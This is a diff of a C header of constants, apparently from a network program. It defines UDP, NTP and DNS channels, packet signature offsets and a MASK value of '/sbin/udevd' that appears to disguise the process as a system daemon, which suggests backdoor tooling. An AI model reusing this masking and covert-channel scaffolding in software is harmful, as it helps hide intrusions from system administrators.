@@ -31,14 +31,17 @@ NOTES: This file holds the constants used throughout the program.
 #define TRUE    1
 #define FALSE   0
 
-#define CHAN_UDP  0
-#define CHAN_NTP  1
+#define CHAN_UDP 0
+#define CHAN_NTP 1
 #define CHAN_DNS 2
 
 #define MASK 	"/sbin/udevd"
 
 #define ETHER_IP_UDP_LEN 44
-#define IP_LEN 	  20
+#define ETHER_HEADER_LEN 16
+#define UDP_SIG 20
+#define NTP_SIG 46
+#define DNS_SIG 28
 #define LOCALHOST 0x0100007F
 
 #define MAX_LEN    4096
